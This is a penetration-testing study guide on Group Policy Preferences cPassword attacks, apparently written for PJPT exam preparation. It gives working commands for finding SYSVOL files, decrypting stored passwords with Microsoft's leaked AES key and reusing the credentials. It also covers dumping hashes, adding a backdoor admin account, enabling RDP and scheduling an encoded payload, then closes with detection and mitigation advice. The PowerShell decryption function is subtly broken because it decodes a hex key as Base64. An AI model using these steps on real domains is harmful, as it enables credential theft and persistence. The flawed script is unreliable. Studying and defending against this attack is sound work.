# GPP / cPassword Attacks

## Overview
Group Policy Preferences (GPP) attacks exploit a critical vulnerability where Microsoft accidentally released the encryption key used to protect passwords stored in Group Policy XML files. This allows attackers to decrypt stored credentials and gain access to privileged accounts.

## Background

### What are Group Policy Preferences?
- **GPP**: Feature that allowed administrators to create policies using embedded credentials
- **Purpose**: Automate password changes, local account management, drive mappings, etc.
- **Problem**: Credentials were encrypted and placed in a "cPassword" field
- **Critical Flaw**: The encryption key was accidentally released by Microsoft

### The cPassword Vulnerability
- **Vulnerability**: Microsoft published the AES encryption key in MSDN documentation
- **Impact**: Anyone can decrypt cPassword values found in Group Policy files
- **Patch**: Fixed in MS14-025 (May 2014) - prevents creation of new cPassword entries
- **Reality**: Patch doesn't remove existing GPP files from SYSVOL
- **Status**: **STILL RELEVANT ON PENTESTS** - old files persist in domain environments

## GPP File Structure

### Common GPP Files in SYSVOL
```bash
# Located in: \\domain.com\SYSVOL\domain.com\Policies\{GUID}\
Groups.xml          # Local group modifications
Services.xml        # Service account passwords  
Scheduledtasks.xml  # Scheduled task credentials
Datasources.xml     # Database connection strings
Drives.xml          # Drive mapping credentials
Printers.xml        # Printer deployment credentials
```

### Example Groups.xml Structure
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
        name="new_local_admin" 
        image="2" 
        changed="2016-07-12 07:04:23" 
        uid="{06FD4385-7388-4B32-BFF0-64F04EB01B22}">
    <Properties action="U" 
                newName="" 
                fullName="" 
                description="" 
                cpassword="Ju9qmLzQeH61Nrqk/bbEB1CfOFVqOIGOUevB4wAvOng" 
                changeLogon="0" 
                noChange="0" 
                neverExpires="0" 
                acctDisabled="0" 
                subAuthority="" 
                userName="new_local_admin"/>
  </User>
</Groups>
```

### Key Fields in GPP Files
| Field | Description | Example Value |
|-------|-------------|---------------|
| TYPE | GPP file type | Groups.xml |
| USERNAME | Account username | new_local_admin |
| PASSWORD | Encrypted password (cPassword) | Ju9qmLzQeH61Nrqk/bbEB1CfOFVqOIGOUevB4wAvOng |
| DOMAIN CONTROLLER | DC IP/hostname | 10.x.x.x |
| DOMAIN | Domain name | penlab.lcl |
| CHANGED | Last modification | 2016-07-12 07:04:23 |
| NEVER_EXPIRES? | Password expiry setting | 1 (never expires) |
| DISABLED | Account status | 0 (enabled) |

## Enumeration Techniques

### Method 1: Metasploit smb_enum_gpp
```bash
# Using Metasploit auxiliary module
msf6 > use auxiliary/scanner/smb/smb_enum_gpp
msf6 auxiliary(smb_enum_gpp) > set RHOSTS 192.168.2.50
msf6 auxiliary(smb_enum_gpp) > set SMBDomain penlab.lcl
msf6 auxiliary(smb_enum_gpp) > set SMBUser username
msf6 auxiliary(smb_enum_gpp) > set SMBPass password
msf6 auxiliary(smb_enum_gpp) > run

# Expected output:
[+] 192.168.2.50:445 - Group Policy Credential Info
=======================================
Name                Value
----                -----
TYPE               Groups.xml
USERNAME           new_local_admin
PASSWORD           $uP3r5ekr1tpass
DOMAIN CONTROLLER  192.168.2.50
DOMAIN             penlab.lcl
CHANGED            2016-07-12 07:04:23
NEVER_EXPIRES?     0
DISABLED           0

[+] 192.168.2.50:445 - XML file saved to: /opt/metasploit/apps/pro/loot/20160712000840_default_192.168.2.50_windows.gpp_file_700506.xml
[+] 192.168.2.50:445 - Groups.xml saved as: /opt/metasploit/apps/pro/loot/20160712000840_default_192.168.2.50_smb_shares_file_700506.xml
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Method 2: Manual SYSVOL Enumeration
```bash
# Mount SYSVOL share
smbclient //domain.com/SYSVOL -U username%password

# Navigate to policies directory
cd domain.com/Policies/

# List all policy GUIDs
dir

# Search for GPP files recursively
find . -name "*.xml" -type f

# Download GPP files for analysis
get {GUID}/Machine/Preferences/Groups/Groups.xml
get {GUID}/User/Preferences/Groups/Groups.xml
```

### Method 3: PowerShell Enumeration
```powershell
# PowerShell script to find GPP files
Get-ChildItem -Path "\\domain.com\SYSVOL\domain.com\Policies\" -Recurse -Include "*.xml" | 
Where-Object { $_.Name -match "(Groups|Services|Scheduledtasks|DataSources|Drives|Printers)" } |
ForEach-Object {
    $content = Get-Content $_.FullName
    if ($content -match "cpassword=") {
        Write-Host "[+] Found cPassword in: $($_.FullName)" -ForegroundColor Green
        $content | Select-String "cpassword=" 
    }
}
```

### Method 4: Linux Command Line Tools
```bash
# Using smbclient and find
smbclient //domain.com/SYSVOL -U username%password -c "prompt OFF; recurse ON; mget *"

# Search for XML files containing cpassword
find . -name "*.xml" -exec grep -l "cpassword" {} \;

# Extract cpassword values
grep -r "cpassword=" . --include="*.xml" | cut -d'"' -f4
```

## Manual Decryption

### Using gpp-decrypt
```bash
# Decrypt cPassword manually using gpp-decrypt
gpp-decrypt Ju9qmLzQeH61Nrqk/bbEB1CfOFVqOIGOUevB4wAvOng
# Output: $uP3r5ekr1tpass

# Decrypt multiple passwords from file
echo "Ju9qmLzQeH61Nrqk/bbEB1CfOFVqOIGOUevB4wAvOng" | gpp-decrypt
echo "otherEncryptedPassword" | gpp-decrypt
```

### PowerShell Decryption Script
```powershell
# PowerShell function to decrypt cPassword
function Decrypt-GPPPassword {
    param([string]$cpassword)
    
    # AES key released by Microsoft
    $key = [System.Convert]::FromBase64String("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
    
    # Base64 decode the cpassword
    $encPassword = [System.Convert]::FromBase64String($cpassword)
    
    # Decrypt using AES
    $aes = [System.Security.Cryptography.AesCryptoServiceProvider]::new()
    $aes.Key = $key
    $aes.IV = New-Object Byte[] 16
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    
    $decryptor = $aes.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($encPassword, 0, $encPassword.Length)
    
    return [System.Text.Encoding]::Unicode.GetString($decryptedBytes).TrimEnd([char]0)
}

# Usage
Decrypt-GPPPassword "Ju9qmLzQeH61Nrqk/bbEB1CfOFVqOIGOUevB4wAvOng"
# Output: $uP3r5ekr1tpass
```

## Attack Scenarios

### Scenario 1: Domain Enumeration via GPP
```bash
# 1. Gain initial domain access (any domain user account)
# Example: low-privilege user from password spraying

# 2. Mount SYSVOL share to search for GPP files
smbclient //dc.domain.com/SYSVOL -U domain/user%password

# 3. Find and download GPP files
find . -name "Groups.xml" -o -name "Services.xml" -o -name "ScheduledTasks.xml"
get Policies/{GUID}/Machine/Preferences/Groups/Groups.xml

# 4. Extract cpassword values
grep "cpassword=" Groups.xml

# 5. Decrypt passwords
gpp-decrypt "encryptedPasswordString"

# Result: Local admin credentials for multiple systems
# Username: new_local_admin
# Password: $uP3r5ekr1tpass
```

### Scenario 2: Automated Discovery with Metasploit
```bash
# 1. Use compromised domain credentials
# Example: user:password from previous attack

# 2. Run Metasploit GPP enumeration
msf6 > use auxiliary/scanner/smb/smb_enum_gpp
msf6 auxiliary(smb_enum_gpp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(smb_enum_gpp) > set SMBDomain company.local
msf6 auxiliary(smb_enum_gpp) > set SMBUser compromised_user
msf6 auxiliary(smb_enum_gpp) > set SMBPass password123
msf6 auxiliary(smb_enum_gpp) > run

# 3. Metasploit automatically:
# - Connects to SYSVOL shares on all DCs
# - Downloads and parses GPP files
# - Decrypts cpassword values
# - Presents cleartext credentials

# 4. Use discovered credentials for lateral movement
# Example: service account with admin rights on multiple servers
```

### Scenario 3: Service Account Discovery
```bash
# Services.xml often contains service account passwords
# 1. Look for Services.xml files in SYSVOL
find /mnt/sysvol -name "Services.xml"

# 2. Extract service account credentials
grep -A5 -B5 "cpassword=" Services.xml

# Example Services.xml content:
# <Service clsid="{...}" name="MyService" image="2" changed="2016-01-15 10:30:00">
#   <Properties startupType="Automatic" 
#               serviceName="MyService"
#               accountName="DOMAIN\svc_service"
#               cpassword="encryptedServicePassword"/>
# </Service>

# 3. Decrypt service account password
gpp-decrypt "encryptedServicePassword"

# Result: Often reveals highly privileged service accounts
```

## Post-Exploitation

### Using Discovered Credentials
```bash
# Test credential validity across domain
crackmapexec smb 192.168.1.0/24 -u new_local_admin -p '$uP3r5ekr1tpass' --local-auth

# Check for admin rights
crackmapexec smb 192.168.1.0/24 -u new_local_admin -p '$uP3r5ekr1tpass' --local-auth --pwn3d

# Execute commands on compromised systems
crackmapexec smb 192.168.1.50 -u new_local_admin -p '$uP3r5ekr1tpass' --local-auth -x "whoami"

# Dump local credentials
secretsdump.py new_local_admin:'$uP3r5ekr1tpass'@192.168.1.50
```

### Persistence and Lateral Movement
```bash
# Use GPP credentials to establish persistence
# 1. Create new local admin accounts
net user backup_admin P@ssw0rd123 /add
net localgroup administrators backup_admin /add

# 2. Enable RDP access
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 3. Create scheduled tasks for persistence
schtasks /create /tn "System Backup" /tr "powershell.exe -enc <base64_payload>" /sc daily /st 02:00 /ru new_local_admin /rp '$uP3r5ekr1tpass'
```

## Detection and Forensics

### Finding GPP Activity
```bash
# Event logs to monitor:
# - Event ID 4648: Explicit credential logon (GPP account usage)
# - Event ID 5140: Network share accessed (SYSVOL access)
# - Event ID 4624: Successful logon (GPP account logons)

# PowerShell detection script
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5140} | 
Where-Object {$_.Message -match "SYSVOL"} |
ForEach-Object {
    Write-Host "SYSVOL Access: $($_.TimeCreated) - User: $($_.Properties[1].Value)" -ForegroundColor Yellow
}
```

### SYSVOL Monitoring
```powershell
# Monitor SYSVOL for unauthorized access
$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = "C:\Windows\SYSVOL\domain\Policies\"
$watcher.Filter = "*.xml"
$watcher.IncludeSubdirectories = $true
$watcher.EnableRaisingEvents = $true

Register-ObjectEvent -InputObject $watcher -EventName Opened -Action {
    $path = $Event.SourceEventArgs.FullPath
    Write-Host "GPP file accessed: $path at $(Get-Date)" -ForegroundColor Red
}
```

## Mitigation Strategies

### Technical Mitigations
```bash
# 1. Apply patch KB2962486 (prevents new cPassword creation)
# Note: This is included in modern Windows versions by default

# 2. Remove existing GPP files from SYSVOL (CRITICAL!)
# Search for files containing cpassword
Get-ChildItem -Path "C:\Windows\SYSVOL\" -Recurse -Include "*.xml" | 
ForEach-Object {
    $content = Get-Content $_.FullName
    if ($content -match "cpassword=") {
        Write-Host "Found cPassword in: $($_.FullName)" -ForegroundColor Red
        # BACKUP THEN DELETE these files!
    }
}

# 3. Audit Group Policy management
# - Review who has GP creation/modification rights
# - Implement approval process for new Group Policies
# - Use LAPS for local administrator password management
```

### Administrative Controls
```bash
# 1. Implement LAPS (Local Administrator Password Solution)
# - Automatically manages local admin passwords
# - Stores passwords in AD with ACL protection
# - Eliminates need for GPP password management

# 2. Use Group Managed Service Accounts (gMSA)
# - Automatic password management for service accounts
# - No need to store service passwords in GPP

# 3. Regular SYSVOL auditing
# - Quarterly scans for remaining GPP files
# - Automated monitoring for new cpassword entries
# - Document and remediate any findings
```

### Network Monitoring
```bash
# Monitor for suspicious SYSVOL access patterns:
# - Multiple XML file downloads from SYSVOL
# - Access to SYSVOL from non-admin accounts
# - Automated tools accessing policy directories

# SIEM detection rules:
# - Event ID 5140 with ShareName=SYSVOL from unexpected sources
# - Multiple GPP file access within short timeframe
# - gpp-decrypt tool usage (process monitoring)
```

## PJPT Exam Tips

### For the PJPT Exam
1. **GPP attacks are high-yield targets**
   - Easy to execute with basic domain access
   - Often reveals privileged credentials
   - Excellent for lateral movement

2. **Use Metasploit for efficiency**:
   ```bash
   use auxiliary/scanner/smb/smb_enum_gpp
   set RHOSTS [DC_IP]
   set SMBDomain [DOMAIN]
   set SMBUser [USERNAME]  
   set SMBPass [PASSWORD]
   run
   ```

3. **Manual verification is valuable**:
   ```bash
   smbclient //dc.domain.com/SYSVOL -U user%pass
   find . -name "*.xml" -exec grep -l "cpassword" {} \;
   gpp-decrypt [cpassword_value]
   ```

4. **Common GPP credential patterns**:
   - Local administrator accounts
   - Service account passwords
   - Scheduled task credentials
   - Database connection strings

5. **Post-exploitation priorities**:
   - Test credentials across all domain systems
   - Look for admin rights on multiple machines
   - Use for lateral movement and persistence
   - Document credential scope and privileges

6. **Key documentation points**:
   - Show GPP file discovery method
   - Include original cpassword and decrypted result
   - Document credential testing and scope
   - Explain impact and lateral movement potential

---

**Note**: Always ensure proper authorization before conducting GPP attacks. These techniques should only be used in authorized penetration testing scenarios or controlled lab environments. Remember that while the vulnerability is "patched," legacy GPP files often remain in production environments, making this attack vector still highly relevant. 